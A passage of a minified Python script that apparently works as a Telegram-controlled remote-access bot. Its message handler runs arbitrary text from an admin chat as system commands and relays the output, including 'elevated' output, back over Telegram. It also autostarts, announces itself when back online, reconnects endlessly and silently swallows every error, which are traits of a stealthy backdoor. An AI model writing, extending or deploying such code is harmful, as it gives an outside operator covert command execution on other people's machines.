   cap=tmp.read_text(encoding="utf-8",errors="replace");tmp.unlink(missing_ok=True)
  except:pass
  body=res+"\n\n--- elevated output ---\n"+(cap or "(no output captured)")
  for chunk in sm(body):
   await m.answer(mo(chunk))
 except:pass
@d.message(F.text)
@req("admin")
async def cF(m):
 try:
  if not ia(m):return
  c=(m.text or"").strip()
  if not c:return
  o=await asyncio.to_thread(rc,c)
  for x in sm(o):
   try:await m.answer(mo(x))
   except:pass
 except:pass
async def na(t):
 try:await b.send_message(A,t)
 except:pass
async def st():
 global _LNAP
 cc()
 _LNAP=rp() or ""
 wd()
 try:r=await asyncio.to_thread(ai)
 except Exception as e:r=f"⚠️ autostart err: {e}"
 await na((await bo())+f"\n\n{r}")
 asyncio.create_task(wcl())
async def nb():
 try:await na(mo("🟢 back online\n\n"+(await bo())))
 except:pass
async def pl():
 global _off
 pt=asyncio.create_task(d.start_polling(b,handle_signals=False))
 if _off:
  _,x=await asyncio.wait([pt],timeout=3.0)
  if pt in x:_off=False;asyncio.create_task(nb())
 try:
  await pt;return False
 except TelegramUnauthorizedError:await na(mo("❌ invalid token — exiting"));return True
 except TelegramConflictError:await na(mo("⚠️ token already in use — exiting"));return True
 except asyncio.CancelledError:return True
 except BaseException as e:
  if not _off:
   _off=True;await na(mo(f"⚠️ connection lost: {type(e).__name__}: {e}"))
  return False
async def mn():
 global _lp
 _lp=asyncio.get_running_loop()
 try:await st()
 except:pass
 while True:
  if await pl():return
  await asyncio.sleep(10)
if __name__=="__main__":
 while True:
  try:asyncio.run(mn());break
  except KeyboardInterrupt:break
  except:
   try:import time;time.sleep(10)
   except:pass